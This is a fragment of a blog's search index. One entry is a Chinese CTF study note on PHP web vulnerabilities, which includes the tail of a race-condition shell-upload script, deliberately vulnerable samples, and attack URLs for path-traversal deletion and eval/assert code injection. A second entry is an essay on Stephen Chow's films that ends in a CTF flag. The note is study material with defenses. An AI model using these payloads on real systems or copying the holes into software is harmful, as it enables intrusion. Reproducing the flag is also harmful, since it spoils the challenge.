<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] get shell file...&#x27;</span>)<br>        requests.get(exp_url)<br>        resp = requests.get(shell_url)<br>        <span class="hljs-keyword">if</span> resp.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] create &#123;&#125;.php success&#x27;</span>.<span class="hljs-built_in">format</span>(shell_name))<br>            os._exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    threads = []<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 线程数也可以自己修改,我这里只是开太多线程本地服务器扛不住</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>            t = threading.Thread(target=get,args=())<br>            threads.append(t)<br>            t.start()<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            t = threading.Thread(target=upload,args=())<br>            threads.append(t)<br>            t.start()        <br><br>        <span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads:<br>            thread.join()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(e))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>可以参考<a href="http://www.lmxspace.com/2018/06/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Ewriteup/">上面讲了19种情景的bypass方法</a></p><h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><p>文件删除漏洞出现在有文件管理功能的应用上很多,这些应用一般都有文件上传和读取等功能。漏洞利用原理和文件读取差不多,只是利用函数不一样。一般是因为删除文件的文件名可以用..&#x2F;跳转,或者没有限制当前用户只能删除他该有权限删除的文件。php中这个漏洞函数通常是unlink()</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$basedir</span> = <span class="hljs-string">&#x27;./uploads/&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] == <span class="hljs-string">&#x27;delete&#x27;</span>)&#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]:<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$filename</span>)&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$basedir</span>.<span class="hljs-variable">$filename</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/filedelete.php?action=delete&amp;filename=../../../../../../../test.txt</code></p><h3 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h3><p>通用防范:</p><ul><li>对权限管理要合理,比如用户A上传的文件,不能被同权限的B用户删除。特殊文件操作需要特权用户才能操作,比如后台删除文件的操作,肯定需要限制管理员才能操作。</li><li>有的文件操作不需要直接传入文件名,比如下载文件时,可以将文件名、路径、ID(MD5形式)及文件上传用户存入数据库中,操作时根据文件ID和当前用户名去判断当前用户有没有权限操作改文件。</li><li>避免目录跳转。禁止<code>..</code>、<code>/</code>、<code>\</code>来跳转目录</li></ul><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>代码执行漏洞指应用程序本身过滤不严,用户可以通过请求将代码注入到应用中执行。这种漏洞如果没有进行特殊过滤,相当于一个web后门的存在。</p><p>php中导致该漏洞的函数:</p><ul><li>eval</li><li>assert</li><li>preg_replace</li><li>call_user_func</li><li>call_user_func_array</li><li>array_map</li><li>php动态函数($a($b))</li><li>…</li></ul><p>eval()和assert()函数导致的代码执行漏洞大多数是因为载入缓存或者模板以及对变量的处理不严格导致,比如直接把一个外部可控的参数拼接到模板里面，然后调用这两个函数去当成php代码执行。</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action_a</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;call action_a method&#x27;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action_b</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;call action_b method&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;action_&#x27;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&#x27;();&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/codexec_eval.php?m=b</code></p><p><code>http://127.0.0.1/codexec_eval.php?m=b();phpinfo();//</code></p><p>preg_replace()函数(<strong>php5.5之前可用</strong>)导致代码执行需要存在<code>/e</code>参数，这个函数原本是用来处理字符串的，因此漏洞出现最多的是在对字符串的处理，比如URL、HTML标签及文章内容过滤等地方。</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$html_body</span> = <span class="hljs-string">&#x27;&lt;a &#123;$&#123;phpinfo()&#125;&#125;&gt;&lt;/a&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#(&lt;/?)(\w+)([^&gt;]*&gt;)#e&quot;</span>,<br>              <span class="hljs-string">&#x27;&quot;\\1&quot;.strtoupper(&quot;\\2&quot;).&quot;\\3&quot;&#x27;</span>,<span class="hljs-variable">$html_body</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/codexec_preg.php</code></p><p>由于php特性的原因，php函数可以直接由字符串拼接，导致动态执行函数。</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/codexec_dynfunc.php?a=assert&amp;b=phpinfo()</code></p><p>还有其他函数，可以自行查阅</p><p>实际环境中可以结合正则表达式使用白名单对参数过滤</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>代码执行是指可以执行代码，命令执行是可以执行系统命令(比如CMD或者BASH命令)。php命令执行是继承webserver用户权限。</p><p>php命令执行函数:</p><ul><li>system</li><li>exec</li><li>shell_exec</li><li>passthru</li><li>pcntl_exec</li><li>popen</li><li>proc_popen</li><li>`</li></ul><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-string">&#x27;whoami &gt;&gt; ./aaa.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-keyword">echo</span> `whoami`;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>防范</p><ul><li>使用escapeshellcmd、escapeshellarg防止命令注入</li><li>参数白名单</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>远古的 blog</title>
    <link href="/1970/01/01/flag_is_here/"/>
    <url>/1970/01/01/flag_is_here/</url>
    
    <content type="html"><![CDATA[<h1 id="人生何处不窘迫"><a href="#人生何处不窘迫" class="headerlink" title="人生何处不窘迫"></a>人生何处不窘迫</h1><p>​也许周星驰从来就不需要被人看懂。他只负责表达。<br>​你看到什么，就是什么。<br>​当你觉得自己看懂了周星驰，其实是通过周星驰的作品看懂了自己。</p><p>​我一直在找一个词，来概括周星驰大多数作品里的主角的共性，现在找到一个：窘迫。<br>​什么是窘迫？<br>​能力追不上梦想，<br>​脚步跟不上灵魂，<br>​计划赶不上变化。<br>​具体一点：<br>​要钱，钱没有。<br>​谈情，情失意。</p><p>​先说钱。<br>​其实当一个人穷惯了之后，有钱没钱反而无所谓。<br>​虽然欲望是人的本能，但是压制欲望是人的技能。<br>​不信你看，把知足常乐挂在嘴边的，大多是穷人。在大部分时候，没钱的窘迫都是不值一提的，无非是苦一点喽，苦中还能作乐呢。<br>​只是，当你在平的人遇到的问题必须要用钱来解决的时候，你才会真正意识到没钱的窘迫。<br>​比如《喜剧之王》里的尹天仇。<br>​在遇到柳飘飘之前，他每天在片场混盒饭吃。<br>​穷又如何？先混着，反正有叉烧饭吃。<br>​但是在与柳飘飘共度良宵之后，他蒙了。<br>​在说完“我养你”之后，他更蒙了。<br>​因为没钱。<br>​你在乎的人，不是一本书不是一块手表，不是放在抽屉里就能平安无事的。<br>​当你在乎的是一个人时，是要花钱的。虽然不多，但是没有就是没有。<br>​那句“我养你”，声音很大，底气不足。<br>​何止不足，是没有。<br>​窘迫吗？非常窘迫。</p><p>​说起没钱的窘迫，我想起一条大家可能都看过的段子。这个段子的原创者是我以前一起玩过脱口秀的一位哥们儿叫梁海源。<br>​段子大意如下:<br>​有一天爸爸陪我逛街，路过玩具店，我看中了一个玩具，隔着橱窗看了很久。<br>​爸爸问我:“喜欢吗? ”<br>​我说:“喜欢! ”<br>​爸爸说:“喜欢的….那就多看一会儿吧!”<br>​我俩就从白天一直看到了晚上。<br>​后来我明白一个道理：爱你的人不一定是愿意为你花钱的人，而是愿意花时间陪你的人。</p><p>​这个段子有两层喜剧效果。<br>​首先是爸爸问完之后，按照常规思维，爸爸应该把玩具买下来。<br>​可这个当爸的只是说了句“喜欢那就多看一会儿吧” 。<br>​窘迫吗？窘迫。简直是实力坑儿。<br>​别人的窘迫，在旁观者看来，本身就已经是一个笑话。<br>​这个段子并没有结束，更深一层的喜剧效果在于儿子对窘迫的解读:爱你的不一一定是愿意为你花钱的人，而是愿意花时间陪你的人。</p><p>​这就是为什么有人说喜刷的内核是悲剧。在这个故事里，两个人都是窘迫的。<br>​当父亲没有能力去满足儿子，他陷入了窘迫。<br>​当儿子想起别人可以有玩具而自己只能隔着橱窗看，他陷入了窘迫。<br>​这就是普通人的生活缩影。玩具，只是一个代码。<br>​在普通人的生活中，这个玩具可能是车子，是房子，是戒指，是父母医药费，甚至是回家的火车票。<br>​不幸的是，现实对大多数人都是残酷的。<br>​幸运的是，现实还是给了你争取玩具的机会。</p><p>​关于玩具，最近流行在朋友圈的一篇文章，也提到了周星驰童年的一件类似的事:<br>​周星驰回忆他童年时看中的玩具:“我常常都说一个故事，就是我小时候，跟爸爸妈妈出去逛街，我看见玩具，但是他们都不买，最后还打了我，因为我要闹，一定要买，但是妈妈-定不买，最后妈妈还打我，我就觉得，你不买还打我，太没有道理了，我只是想要一个玩具而已。”<br>​“你不买还打我，太没有道理了，我只是想要一个玩具而已。”<br>​没有任何一个当父母的愿意知道儿子在童年会有这样一段内心经历。<br>​这样的窘迫就不用拆开解读了。<br>​当时候周星驰应该还小，他只知道窘迫，但不知道为什么会窘迫。</p><p>​再后来，通过他的另一件童年往事，可以看出来，他已经知道了为什么窘迫。<br>​幼时家境贫困，还有两个姐妹，每次吃饭母亲总把肉央给他，可每次周星驰都会把吃剩下的肉放嘴里咬一遍再吐出来，更过分的是有一次他竟把整个鸡腿扔到地上，母亲认为他很自私，忍不住打了他。<br>直到后来周星驰带母亲上节目，终于说了自己那么做的原因——他发现母亲很少吃肉， 但又命令周星驰要把肉吃完，于是周星驰故意把肉弄胜留给妈妈吃。<br>​这时候周星驰已经是一个“心机娘”了。<br>​窘迫的人，表达爱的方式是不同的，加上他内向的性格，那使他用更婉转的方式去表达爱。<br>​他用不懂事的方法去表达懂事。</p><p>​很多人都说过，小时候看周星驰的电影是笑，长大了再看，是哭。<br>​因为你看到了“虐”。<br>​周星驰太擅长虐了、毕竟从小就手到擒来。</p><p>​说完钱，说感情。<br>​在《少林足球》里、周星驰饰演的阿星与赵薇饰演的阿梅有这么一段对话。<br>​阿梅:“我喜欢你。 ”<br>​阿星:“我也喜欢你啊。 ”<br>​阿梅:“那我们之间是爱情吗? ”<br>​阿星:“…你是开玩笑的吧? ”<br>​阿梅:“我是认真问你的， 真的。”<br>​阿星:“那当然不是爱..我们永远都是好朋友嘛，那不是更好吗?<br>​阿梅:“那你以后也可以常常来找我。 鞋子破了，我还可以帮你补。”<br>​阿星:“不用了，鞋子破了，我就把它扔掉。我们都要向前看嘛，我永远都不要再穿破鞋子了。”<br>​阿梅哭。<br>​阿星:“你不要这样子，干吗你哭了，不要这样子嘛。”<br>​阿梅:  “我明白了，谢谢你。”<br>​(补充一句:这场戏谈到了“爱”，但真正体现两个人感情精髓的，是这场戏前面的那场没有提“爱”的戏。非常精彩。)</p><p>​阿星喜欢阿梅，但不敢承认。很简单，阿梅太丑。<br>​怎么说呢，阿梅这个角色是一双破旧的球鞋，阿星本身不抗拒破旧的球鞋，甚至觉得穿着舒服。<br>​但是他抗拒别人看他的眼光。<br>​“走自己的路，让别人去说吧。”这句话对大部分人来说，也只是说说而已。<br>​就算我们已经下定决心不在意别人的眼光，但也需要时间。<br>​他不但不敢承认，还要再来一发“鞋子破了我就把它扔掉”的暴击。<br>​丑的是阿梅，自卑的是阿星。<br>​一个男人要克服自卑，不是去穿-双崭 新的高级球鞋，而是在买得起新球鞋之后还愿意重新穿上那双破旧的球鞋。<br>那个晚上，阿星没有跨过这道坎，他还没有克服自卑，他选择压抑真实的自己。<br>还有比这更窘迫的吗?</p><p>​有。<br>​在《功夫》里。<br>​周星驰在发现黄圣依的真实身份后，仍然抢了她的钱罐。<br>​他本可以停止，但他选择继续。<br>​要面子，装坏人，这是没有意义的执着。<br>​抢完之后，他还是崩溃了，一个善良的 loser,在干坏事方面也是失败透顶。<br>​这些年，我过得不好，你过得不差，这辈子根本没想过会再见面。<br>​但今日一见，没想到是这样的方式。<br>​十八年前我保护你不被流氓欺负，十八年后我变成了欺负你的流氓。</p><p>​还有比这有窘迫的吗?有。<br>​在《国产凌凌漆》中。<br>​袁咏仪帮周星驰取出了大腿上的子弹，周星驰发现这颗子弹来自袁咏仪的枪。<br>​他喜欢她，并且为她去摘白色玫瑰，却因此暴露了自己的位置，被袁咏仪的枪击中。<br>​我愿意给你的不只是玫瑰，还有我的命。但我却发现要我命的人居然是你?<br>​人生何处不窘迫。怪谁呢?好像也不知道怪谁。<br>​也许感情上的无厘头就是冤无头债无主。徐现特的周星驰太擅长处理这些感情戏。看似乱成麻，其实一根线。</p><p>​关于周星驰，不想称他为大师或神，也不想说欠他电影票。<br>​他只是这样一个存在:这个行业里所有人都想超越他，包括他自己。<br>​最后有一句话共勉: 每一个正在努力改变自己窘迫命运的人，都值得被尊重。</p><blockquote><p>Here is your flag: <code>5_a_c@nner_can_Can_@_can&#125;</code></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
